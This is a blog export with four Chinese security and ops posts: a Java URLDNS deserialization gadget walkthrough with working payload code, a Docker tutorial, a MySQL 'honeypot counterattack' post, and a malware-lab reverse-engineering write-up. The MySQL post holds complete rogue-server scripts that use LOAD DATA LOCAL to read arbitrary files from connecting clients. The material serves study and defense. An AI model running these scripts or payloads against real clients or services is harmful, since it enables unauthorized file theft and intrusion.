{"meta":{"title":"s1eep123のblog","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2022-08-31T16:16:30.000Z","updated":"2022-09-01T01:42:06.275Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"1才华还撑不起你的野心时，我该怎么办"},{"title":"tags","date":"2022-09-01T00:00:19.000Z","updated":"2022-09-01T00:00:42.444Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-08-31T23:57:39.000Z","updated":"2022-08-31T23:58:38.167Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2022-09-01T01:52:33.211Z","updated":"2022-09-01T01:52:33.211Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":""}],"posts":[{"title":"URLDNS链","slug":"urldns","date":"2022-08-11T13:16:50.000Z","updated":"2022-09-01T00:55:00.670Z","comments":true,"path":"2022/08/11/urldns/","link":"","permalink":"http://example.com/2022/08/11/urldns/","excerpt":"","text":"URLDNS链 概述 URLDNS 就是ysoserial中一个利用链的名字，但准确来说，这个其实不能称作“利用链”。因为其参数不不是一个可以“利用”的命令，而仅为一个URL，其能触发的结果也不是命令执行，而是一次DNS请求。 虽然这个“利用链”实际上是不能“利用”的，但因为其如下的优点，非常适合我们在检测反序列化漏洞时使用： 使用Java内置的类构造，对第三方库没有依赖 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 利用链 12345* Gadget Chain:* HashMap.readObject()* HashMap.putVal()* HashMap.hash()* URL.hashCode() HashMap底层原理 HashMap是Map的一个实现类，以数组+(链表或红黑树)实现。它是以键值对存储数据的，Key-Value都是Map.Entry中的属性 在实例化以后，底层创建了长度是16的一维数组Entry[] table,其中每个节点用Node表示 123456Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; this.hash = hash; this.key = key; this.value = value; this.next = next; &#125; 当put一个键值对时，首先对key进行hash，其中hash中又调用hashcode方法，之后添加tab数组中添加node,源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true); &#125; static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125; final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else &#123; Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; else if (p instanceof TreeNode) e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); else &#123; for (int binCount = 0; ; ++binCount) &#123; if ((e = p.next) == null) &#123; p.next = newNode(hash, key, value, null); if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; &#125; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; if (e != null) &#123; // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; if (++size &gt; threshold) resize(); afterNodeInsertion(evict); return null; &#125; 原理利用 java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，关键代码如下 123456789101112131415161718192021222324252627282930313233343536373839private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125;static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125;public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125;protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); //解析域名，发出DNS请求 return h; 因此利用链就很显而易见了 代码 123HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://pxqb7n.dnslog.cn&quot;); hashMap.put(url,123); 可以看到收到DNS请求，下面将hashMap序列化。 1234567891011121314//由于new URL()中的hashCode=-1，因此反序列化时，不能进入DNS解析，因此需反射设置hashCode！=-1HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://6g01re.dnslog.cn&quot;); Class urlClass = URL.class; Field fieldHashCode = urlClass.getDeclaredField(&quot;hashCode&quot;); fieldHashCode.setAccessible(true); fieldHashCode.set(url,123456); hashMap.put(url,123); fieldHashCode.set(url,-1); serialize(hashMap); //unSerialize(&quot;ser.bin&quot;); 可以看到put时为收到DNS请求 反序列化时收到请求 总代码如下 12345678910111213141516171819202122232425262728293031323334353637package urldns;import java.io.*;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class urldns &#123; public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123; HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://dr8bqb.dnslog.cn&quot;); Class urlClass = URL.class; Field hashCode = urlClass.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url,123); hashMap.put(url,112233); hashCode.set(url,-1); serialize(hashMap); unSerialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream ooStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); ooStream.writeObject(obj); &#125; public static Object unSerialize(String fileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream oiStrean = new ObjectInputStream(new FileInputStream(fileName)); Object obj = oiStrean.readObject(); return obj; &#125;&#125;","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"docker使用","slug":"docker使用","date":"2022-08-09T13:16:50.000Z","updated":"2022-09-01T01:26:01.836Z","comments":true,"path":"2022/08/09/docker使用/","link":"","permalink":"http://example.com/2022/08/09/docker%E4%BD%BF%E7%94%A8/","excerpt":"","text":"概述 Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。 docker优点 相比配置各种复杂环境，docker将应用程序和环境配置分开。因此可以快速部署，测试代码，大大减少编写代码和在生产环境中运行代码之间的延迟。 docker架构docker包括三个基本概念 镜像（Image）：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。 容器（Container）：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。 仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。 概念 说明 Docker 镜像(Images) Docker 镜像是用于创建 Docker 容器的模板，比如 Ubuntu 系统。 Docker 容器(Container) 容器是独立运行的一个或一组应用，是镜像运行时的实体。 Docker 客户端(Client) Docker 客户端通过命令行或者其他工具使用 Docker SDK (https://docs.docker.com/develop/sdk/) 与 Docker 的守护进程通信。 Docker 主机(Host) 一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。 Docker Registry Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。Docker Hub(https://hub.docker.com) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 &lt;仓库名&gt;:&lt;标签&gt; 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。 Docker Machine Docker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker，比如VirtualBox、 Digital Ocean、Microsoft Azure。 docker安装 首先，更新软件包索引，并且安装必要的依赖软件，来添加一个新的 HTTPS 软件源： 12sudo apt updatesudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common 使用下面的 curl 导入源仓库的 GPG key： 1curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 将 Docker APT 软件源添加到你的系统： 1sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; 想要安装 Docker 最新版本，运行下面的命令。 12sudo apt updatesudo apt install docker-ce docker-ce-cli containerd.io docker配置国内镜像源 阿里云申请镜像地址https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors touch &#x2F;etc&#x2F;docker&#x2F;daemon.json vim &#x2F;etc&#x2F;docker&#x2F;daemon.json,添加以下内容 123&#123; &quot;registry-mirrors&quot;: [&quot;https://xxx.mirror.aliyuncs.com&quot;]&#125; systemctl reload docker systemctl restart dockerservice docker基本操作 帮助命令 12345678#显示docker的版本信息docker version #显示docker的系统信息，包括镜像和容器数量 docker info #显示命令帮助信息 docker 命令 --help 镜像命令 1234567891011#查看所有本地的主机上的镜像docker images #在docker hub上搜索指定镜像，默认tag为latest docker search &lt;image&gt;:&lt;tag&gt; #下载指定镜像docker pull &lt;image&gt;:&lt;tag&gt; #删除指定镜像docker rmi -f &lt;image ID&gt; 容器命令 使用容器命令之前，必须要有相应的镜像 新建容器 1234567891011#新建容器并使用docker run [可选参数] &lt;image&gt; --name=&quot;Name&quot; 容器名字，用于区分容器 -d 后台方式运行 -it 使用交互式方式运行，进入容器查看内容 -p 指定容器映射端口 -p 8080:8080 -p ip:主机端口:容器端口 -p 主机端口:容器端口 -p 容器端口 -P 随机指定端口 -e 修改配置文件 查看容器 12345#查看正在运行的容器docker ps #查看所有容器docker ps -a 退出容器 12345#退出并停止交互容器exit或Ctrl+P #退出但不停止容器Ctrl+P+Q 删除容器 12345#删除容器（不能删除正在运行的容器，若强制删除则需加上-f参数）docker rm #强制删除所有容器docker rm -f $(docker ps -aq) 启动和停止容器 1234567891011#启动容器docker start id #重启容器docker restart id #停止容器docker stop id #强制停止docker kill id 其他命令 后台启动容器 1docker run -d ubuntu 查看日志 1docker logs -tf --tail &lt;num&gt; &lt;id&gt; 查看容器进程信息 1docker top id 进入当前正在运行容器 1234567通常容器是在后台运行，但有时需要进入容器修改配置#方式一，进入容器开启新的终端docker exec -it id bash#方式二，进入容器正在执行的终端docker attach id bash 查看CUP状态 1docker stats id 举例 部署Nginx 123456789101112131415161718192021 #搜索镜像 docker search nginx #拉取镜像 docker pull nginx #查看镜像 docker images root@ubuntu:/home/xiaoh# docker images REPOSITORY TAG IMAGE ID CREATED SIZE nginx latest 605c77e624dd 2 weeks ago 141MB #后台启动镜像 docker run -d --name nginx01 -p 1234:80 nginx #测试是否启动 curl 127.0.0.1:1234 &lt;h1&gt;Welcome to nginx!&lt;/h1&gt;- 部署Tomcat #拉取镜像docker pull tomcat #后台启动镜像docker run -d -p 3456:8080 –name tomcat01 nginx #进入容器docker exec -it tomcat01 &#x2F;bin&#x2F;bash #发现缺少linux命令、缺少webapps。原因是阿里云默认下载最小镜像，所有其他不必要的资源都会被剔除，只保证最小可运行的环境。 #复制webappscp -r webapps.dist&#x2F;* webapps&#96;&#96;&#96;","categories":[{"name":"docker","slug":"docker","permalink":"http://example.com/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"Mysql蜜罐反制","slug":"mysql蜜罐反制","date":"2022-08-09T13:16:50.000Z","updated":"2022-09-01T02:40:48.050Z","comments":true,"path":"2022/08/09/mysql蜜罐反制/","link":"","permalink":"http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/","excerpt":"","text":"Mysql登录分析 命令行登录Mysql，并抓包，可以看到 首先对Mysql版本进行验证 接着Request login，传输用户名和密码hash 登录成功，返回OK 查询版本号并返回 当执行一条语句时，抓包如下，可以看到查询语句明文传输 Navicat登录分析 登录流程和命令行登录差不多，多了几次Query 流程如下 Mysql特性 Mysql 默认打开local_infile，如为打开可执行下列命令 show global variables like&#39;local_infile&#39;; set global local_infile=1; 12345672. MySQL服务端可以利用`LOAD DATA LOCAL`命令来读取`MYSQL`客户端的任意文件，然后伪造恶意服务器向连接到这个服务器的客户端发送读取文件的`payload`。3. 本地执行命令 ```mysql load data local infile &#x27;C:/Users/royal/Desktop/pass/passwd.txt&#x27; into table test.test1 fields terminated by &#x27;\\n&#x27;; ![image-20220830105153036](https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105153036.png) 可以看到成功读取数据并写入表中 命令分析 抓包 执行query查询，重点看下返回包 接着读取文件内容并写入 反制 反制流程也很明了了，就是socket编程模拟navicat登录，然后服务端(蜜罐)发送load local file payload即可 脚本如下 12345678910111213141516171819202122232425262728293031323334353637# 模拟Mysql登录import socketserversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) port = 3306serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)serversocket.bind((&quot;&quot;, port))serversocket.listen(5)while True: # 建立客户端连接 clientsocket,addr = serversocket.accept() print(&quot;连接地址: %s&quot; % str(addr)) # 返回版本信息 version_text = b&quot;\\x4a\\x00\\x00\\x00\\x0a\\x38\\x2e\\x30\\x2e\\x31\\x32\\x00\\x08\\x00\\x00\\x00\\x2a\\x51\\x47\\x38\\x48\\x17\\x12\\x21\\x00\\xff\\xff\\xc0\\x02\\x00\\xff\\xc3\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7a\\x6f\\x6e\\x25\\x61\\x3e\\x48\\x31\\x25\\x43\\x2b\\x61\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot; clientsocket.sendall(version_text) try: # 客户端请求信息 clientsocket.recv(9999) except Exception as e: print(e) # Response OK verification = b&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot; clientsocket.sendall(verification) try: # SET NAMES utf8mb4 clientsocket.recv(9999) except Exception as e: print(e) # Response TABULAR evil_response = b&quot;\\x09\\x00\\x00\\x01\\xfb\\x43\\x3a\\x2f\\x31\\x2e\\x74\\x78\\x74&quot; clientsocket.sendall(evil_response) # file_text print(clientsocket.recv(9999)) clientsocket.close() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# 反制脚本 读取C:\\\\Windows\\\\PFRO.log文件# coding=utf-8import socketimport osserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM) port = 3306server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)server.bind((&quot;&quot;, port))server.listen(5)def get_data(filename, client, addr): base_path = os.path.abspath(&#x27;.&#x27;) + &quot;/log/&quot; + addr[0] if not os.path.exists(base_path): os.makedirs(base_path) evil_response = str.encode(chr(len(filename)+1)) + b&quot;\\x00\\x00\\x01\\xfb&quot; + str.encode(filename) # 恶意响应包 client.sendall(evil_response) file_data = client.recv(999999) print(file_data) with open(base_path + &quot;/&quot; + filename.replace(&quot;/&quot;, &quot;_&quot;).replace(&quot;:&quot;, &quot;&quot;), &quot;wb+&quot;) as f: f.write(file_data) f.close()while True: # 建立客户端连接 client, addr = server.accept() print(&quot;连接地址: %s&quot; % str(addr)) # 返回版本信息 version_text = b&quot;\\x4a\\x00\\x00\\x00\\x0a\\x38\\x2e\\x30\\x2e\\x31\\x32\\x00\\x08\\x00\\x00\\x00\\x2a\\x51\\x47\\x38\\x48\\x17\\x12\\x21\\x00\\xff\\xff\\xc0\\x02\\x00\\xff\\xc3\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7a\\x6f\\x6e\\x25\\x61\\x3e\\x48\\x31\\x25\\x43\\x2b\\x61\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot; client.sendall(version_text) try: # 客户端请求信息 client.recv(9999) except Exception as e: print(e) # Response OK verification = b&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot; client.sendall(verification) try: # SET NAMES utf8mb4 client.recv(9999) except Exception as e: print(e) # Response TABULAR filename = &quot;C:\\\\Windows\\\\PFRO.log&quot; #这里为要读取的文件路径 get_data(filename, client, addr) client.close()","categories":[{"name":"红蓝攻防","slug":"红蓝攻防","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"攻防","slug":"攻防","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2/"}]},{"title":"恶意代码分析lab9-1","slug":"lab9-1","date":"2022-08-06T13:16:50.000Z","updated":"2022-09-01T00:52:23.531Z","comments":true,"path":"2022/08/06/lab9-1/","link":"","permalink":"http://example.com/2022/08/06/lab9-1/","excerpt":"","text":"纵观详细分析 打开程序观察堆栈发现并不是main函数入口点 利用ida分析main函数地址，并在od中断点 一步一步跟进调试 查看参数个数是否为1，继续向下直接call 401000 代码太长不好截图，直接放代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283.text:00402410 push ebp.text:00402411 mov ebp, esp.text:00402413 sub esp, 208h.text:00402419 push ebx.text:0040241A push esi.text:0040241B push edi.text:0040241C push 104h ; nSize.text:00402421 lea eax, [ebp+Filename].text:00402427 push eax ; lpFilename.text:00402428 push 0 ; hModule.text:0040242A call ds:GetModuleFileNameA.text:00402430 push 104h ; cchBuffer.text:00402435 lea ecx, [ebp+Filename].text:0040243B push ecx ; lpszShortPath.text:0040243C lea edx, [ebp+Filename].text:00402442 push edx ; lpszLongPath.text:00402443 call ds:GetShortPathNameA.text:00402449 mov edi, offset aCDel ; &quot;/c del &quot;.text:0040244E lea edx, [ebp+Parameters].text:00402454 or ecx, 0FFFFFFFFh.text:00402457 xor eax, eax.text:00402459 repne scasb.text:0040245B not ecx.text:0040245D sub edi, ecx.text:0040245F mov esi, edi.text:00402461 mov eax, ecx.text:00402463 mov edi, edx.text:00402465 shr ecx, 2.text:00402468 rep movsd.text:0040246A mov ecx, eax.text:0040246C and ecx, 3.text:0040246F rep movsb.text:00402471 lea edi, [ebp+Filename].text:00402477 lea edx, [ebp+Parameters].text:0040247D or ecx, 0FFFFFFFFh.text:00402480 xor eax, eax.text:00402482 repne scasb.text:00402484 not ecx.text:00402486 sub edi, ecx.text:00402488 mov esi, edi.text:0040248A mov ebx, ecx.text:0040248C mov edi, edx.text:0040248E or ecx, 0FFFFFFFFh.text:00402491 xor eax, eax.text:00402493 repne scasb.text:00402495 add edi, 0FFFFFFFFh.text:00402498 mov ecx, ebx.text:0040249A shr ecx, 2.text:0040249D rep movsd.text:0040249F mov ecx, ebx.text:004024A1 and ecx, 3.text:004024A4 rep movsb.text:004024A6 mov edi, offset aNul ; &quot; &gt;&gt; NUL&quot;.text:004024AB lea edx, [ebp+Parameters].text:004024B1 or ecx, 0FFFFFFFFh.text:004024B4 xor eax, eax.text:004024B6 repne scasb.text:004024B8 not ecx.text:004024BA sub edi, ecx.text:004024BC mov esi, edi.text:004024BE mov ebx, ecx.text:004024C0 mov edi, edx.text:004024C2 or ecx, 0FFFFFFFFh.text:004024C5 xor eax, eax.text:004024C7 repne scasb.text:004024C9 add edi, 0FFFFFFFFh.text:004024CC mov ecx, ebx.text:004024CE shr ecx, 2.text:004024D1 rep movsd.text:004024D3 mov ecx, ebx.text:004024D5 and ecx, 3.text:004024D8 rep movsb.text:004024DA push 0 ; nShowCmd.text:004024DC push 0 ; lpDirectory.text:004024DE lea eax, [ebp+Parameters].text:004024E4 push eax ; lpParameters.text:004024E5 push offset File ; &quot;cmd.exe&quot;.text:004024EA push 0 ; lpOperation.text:004024EC push 0 ; hwnd.text:004024EE call ds:ShellExecuteA.text:004024F4 push 0 ; int.text:004024F6 call _exit.text:004024F6 sub_402410 endp 大体就是得到本地文件路径，拼凑字符串在本地尝试可以看到此命令为删除指定路径的文件(怪不得每次点击exe文件就没了，还以为防火墙删了emm)调用SHELL32的ShellExecute函数执行拼接的字符串，但由于已在od中打开，所以不会删除接着往下看，传入参数-in后call 40380f 在main函数中找到__mbscmp相关调用（call的40380f），此函数是比较字符串是否相等的 此函数（40380f）的返回值为910000 可以看到参数-c -cc -re- in 参数 地址 功能 -in .text:00402600 -c -cc .text:0x401280 -re 接着往下看，添加-in参数后Ctrl+F2重新调试 可见跳过删除自身，push参数call 402510 分析402510函数，发现对传入参数进行是否为abcd的校验 校验失败，call 402410函数，就是之前删除自身的函数 改变参数为-in abcd，即可跳过 call 0040380，ida分析为_mbscmp函数 call 4025B0 该函数作用为获取文件名且返回result&#x3D;0 接着往下走，call 402600 应该是最重要的对应参数函数 可以看到所传参数为4025B0的返回值（即当前文件文件名） 跟进后看到call了_alloca_probe（可能与注册内存有关，先不管）和4025b0（先前分析过为截取文件名） 接着跟进发现跳转到402632，发现此函数前部分是实现拼接字符串%SYSTEMROOT%\\system32\\Lab09-01.exe的操作，然后调用OpenScManagerA 可以OpenScManagerA传入参数为3个立即数，之前分析知道它返回一个服务控制管理器句柄，所有要和服务交互的代码会调用这个函数； 对于这种官方API函数可以跳过 接着调用OpenService函数，参数为自身文件名，可以判断开启一个自身服务 接着调用ChangeServiceConfigA和CloseService函数 其中ChangeServiceConfigA所传参数如下，hService为之前开启的自身服务 再往下发现就跳出了402600函数，因此可以推断-in参数为创建服务功能，ida F5伪代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172int __cdecl sub_402600(LPCSTR lpServiceName)&#123; int result; // eax@2 SC_HANDLE hService; // [sp+Ch] [bp-1408h]@5 SC_HANDLE hServicea; // [sp+Ch] [bp-1408h]@9 char v4; // [sp+10h] [bp-1404h]@1 CHAR Filename; // [sp+410h] [bp-1004h]@14 CHAR DisplayName; // [sp+810h] [bp-C04h]@9 CHAR BinaryPathName; // [sp+C10h] [bp-804h]@6 SC_HANDLE hSCManager; // [sp+1010h] [bp-404h]@3 CHAR Src; // [sp+1014h] [bp-400h]@3 if ( sub_4025B0(&amp;v4) ) return 1; strcpy(&amp;Src, aSystemrootSyst); //aSystemrootSyst==%SYSTEMROOT%\\system32\\ strcat(&amp;Src, &amp;v4); strcat(&amp;Src, a_exe); hSCManager = OpenSCManagerA(0, 0, 0xF003Fu); //调用OpenSCManagerA，打开一个服务管理器， if ( !hSCManager ) return 1; hService = OpenServiceA(hSCManager, lpServiceName, 0xF01FFu); //服务即自身exe，创建一个服务， if ( hService ) //如果服务已经创建打开服务 &#123; if ( !ChangeServiceConfigA(hService, 0xFFFFFFFF, 2u, 0xFFFFFFFF, &amp;BinaryPathName, 0, 0, 0, 0, 0, 0) ) &#123; //并添加进启动项 CloseServiceHandle(hService); CloseServiceHandle(hSCManager); return 1; &#125; CloseServiceHandle(hService); CloseServiceHandle(hSCManager); &#125; else &#123; strcpy(&amp;DisplayName, lpServiceName); strcat(&amp;DisplayName, aManagerService); //创建一个服务 hServicea = CreateServiceA(hSCManager, lpServiceName, &amp;DisplayName, 0xF01FFu, 0x20u, 2u, 1u, &amp;Src, 0, 0, 0, 0, 0); if ( !hServicea ) &#123; CloseServiceHandle(hSCManager); return 1; &#125; CloseServiceHandle(hServicea); CloseServiceHandle(hSCManager); &#125; if ( ExpandEnvironmentStringsA(&amp;Src, &amp;BinaryPathName, 0x400u) ) &#123; if ( GetModuleFileNameA(0, &amp;Filename, 0x400u) ) &#123; if ( CopyFileA(&amp;Filename, &amp;BinaryPathName, 0) ) //将自己复制到 %SYSTEMROOT%\\\\system32\\\\xxx，即写进system32目录 &#123; if ( sub_4015B0(&amp;BinaryPathName) ) result = 1; else result = sub_401070(aUps, aHttpWww_practi, a80, a60) != 0; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; return result;&#125; 可以看到已启动自身服务 至此，-in参数分析结束 接着分析-re参数 修改参数为-re abcd 经过_mbscmp函数后eax返回值为1，跳转到-re参数 接着和-in参数一样call 40380f比较字符串,call 4025b0获取文件名 接着call 402900进入-re参数函数 反汇编查看代码,初步判断为删除服务的，od跟进看看 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667int __cdecl sub_402900(LPCSTR lpServiceName)&#123; int result; // eax@2 SC_HANDLE hService; // [sp+Ch] [bp-C08h]@3 char v3; // [sp+10h] [bp-C04h]@7 CHAR Dst; // [sp+410h] [bp-804h]@9 SC_HANDLE hSCManager; // [sp+810h] [bp-404h]@1 CHAR Src; // [sp+814h] [bp-400h]@9 hSCManager = OpenSCManagerA(0, 0, 0xF003Fu); if ( hSCManager ) &#123; hService = OpenServiceA(hSCManager, lpServiceName, 0xF01FFu); if ( hService ) &#123; if ( DeleteService(hService) ) &#123; CloseServiceHandle(hSCManager); CloseServiceHandle(hService); if ( sub_4025B0(&amp;v3) ) &#123; result = 1; &#125; else &#123; strcpy(&amp;Src, aSystemrootSyst); strcat(&amp;Src, &amp;v3); strcat(&amp;Src, a_exe); if ( ExpandEnvironmentStringsA(&amp;Src, &amp;Dst, 0x400u) ) &#123; if ( DeleteFileA(&amp;Dst) ) &#123; if ( sub_401070(&amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60) ) result = 1; else result = sub_401210() != 0; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; &#125; else &#123; CloseServiceHandle(hSCManager); CloseServiceHandle(hService); result = 1; &#125; &#125; else &#123; CloseServiceHandle(hSCManager); result = 1; &#125; &#125; else &#123; result = 1; &#125; return result;&#125; 同样的流程，只不过open改为deleteService 跟进发现服务已禁用 接着deletefile 到此，对于-re参数功能的分析已经结束，我们知道这是删除服务功能； 下面分析-c参数 修改参数为-c abcd 进入调试执行，此处应该就是-c参数代码段 可以看到有2个jnz跳转(402cd9,402ccf) 因为参数为-c所以402cd9不跳转，接下来分析下402ccf,od中是跳转了的 简单反汇编一下可以看到，判断参数是否为7 如果不为7，则call 402410,之前分析过这个函数是删除自身 更改参数如图，实际指令为(xxxx.exe -c 111 222 333 444 abcd)共7个参数，后重新调试 可以看到进入401070函数，并对输入的参数111 222 333 444处理 参数入栈后调用401070,应该就是-c的函数了，进入看看 大概意思就是创建注册表key，然后设置value，一步一步跟进 打开注册表按照参数发现雀氏添加了所传入的参数 接着跳出main函数，结束 至此-c 参数分析完毕，即向指定注册表添加value 接着分析-cc abcd 有两个跳转，od跟进发现并没有跳转，先过。接着call 401280 反汇编查看代码 大概就是注册表查value 打开注册表，然后查值 跳出401280后call 402e74（感觉想printf函数） 发现将查询到的value打印出来，然后删除自身，结束 接下来分析无参，设置参数为abcd 跳转至此401000， 接着call 402360 发现是一个死循环，且通过401280和402020跳出循环 查看401280 猜测如果查询注册表中的value，则跳出循环 查看402020 代码较长不放了 先call了401e60 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162signed int __cdecl sub_401E60(char *a1, signed int a2)&#123; signed int result; // eax@2 u_short hostshort[2]; // [sp+8h] [bp-1424h]@3 char name; // [sp+Ch] [bp-1420h]@1 char *v5; // [sp+40Ch] [bp-1020h]@11 int v6; // [sp+410h] [bp-101Ch]@1 char *v7; // [sp+414h] [bp-1018h]@13 int v8; // [sp+418h] [bp-1014h]@5 char *v9; // [sp+428h] [bp-1004h]@9 char v10; // [sp+42Ch] [bp-1000h]@7 v6 = 4096; if ( sub_401420(&amp;name, 1024) ) &#123; result = 1; &#125; else if ( sub_401470(hostshort) ) &#123; result = 1; &#125; else if ( sub_401D80(&amp;v8) ) &#123; result = 1; &#125; else if ( sub_401AF0(&amp;name, hostshort[0], (int)&amp;v8, &amp;v10, (int)&amp;v6) ) &#123; result = 1; &#125; else &#123; v9 = strstr(&amp;v10, asc_40C090); if ( v9 ) &#123; v5 = v9; v9 = strstr(v9, asc_40C088); if ( v9 ) &#123; v7 = v9; if ( v9 - v5 + 1 &lt;= a2 ) &#123; qmemcpy(a1, &amp;v5[strlen(asc_40C090)], v7 - v5 - strlen(asc_40C090)); a1[v7 - v5 - strlen(asc_40C090)] = 0; result = 0; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; return result;&#125; 其中401420中调用了401280，即-cc参数，就是查询value 接着call了401470，进去看到call了401280和402f6a 接着call了401d80 先获取了当前时间time 